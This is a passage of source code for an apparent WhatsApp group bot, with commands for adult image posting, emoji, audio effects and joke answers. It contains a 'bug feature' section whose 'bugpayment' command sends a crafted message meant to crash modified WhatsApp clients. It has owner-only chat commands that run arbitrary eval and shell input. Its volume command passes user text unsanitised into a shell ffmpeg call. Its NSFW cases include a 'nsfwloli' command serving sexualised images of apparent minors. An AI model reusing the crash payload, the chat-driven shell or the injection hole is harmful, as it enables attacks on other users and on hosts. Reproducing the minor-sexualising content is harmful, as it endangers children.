Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return replygcxeon(mess.group)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await Kyuu.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Kyuu.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await Kyuu.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
Kyuu.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcxeon("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcxeon(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcxeon('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Kyuu.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await Kyuu.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await Kyuu.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
Kyuu.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
Kyuu.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcxeon("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcxeon('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcxeon(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Kyuu.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
case 'spotify':
if (!text) return replygcxeon(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcxeon(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await Kyuu.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await Kyuu.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replygcxeon(mess.wait)
                let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                Kyuu.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcxeon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcxeon(e)
                }
                break
                case 'define': 
if (!q) return replygcxeon(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcxeon(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Kyuu.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcxeon(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcxeon(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcxeon(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
case 'where': {
if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcxeon(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcxeon(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcxeon(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcxeon(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Kyuu.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Kyuu.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'jadian': {
            if (!m.isGroup) return replygcxeon(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
Kyuu.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                Kyuu.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcxeon('Enter Query Title')
                replygcxeon(mess.wait)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                Kyuu.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcxeon('Enter Query Title')
                replygcxeon(mess.wait)
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                Kyuu.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
	//bug feature
case 'bugpayment' : { //crashes mod whatsapps
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Example : ${prefix + command} xeon bihari😂`)
const { xeonorwot } = require('./XBug/xeonbut2')
let teks = `${text}`
{
Kyuu.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${xeonorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA XEON`,"body": ` ${xeonytimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: xwebsite,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'bugreact':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
Kyuu.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break

default:
if (budy.startsWith('<')) {
if (!XeonTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!XeonTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!XeonTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Kyuu.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
Kyuu.sendMessage("6285743137623@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})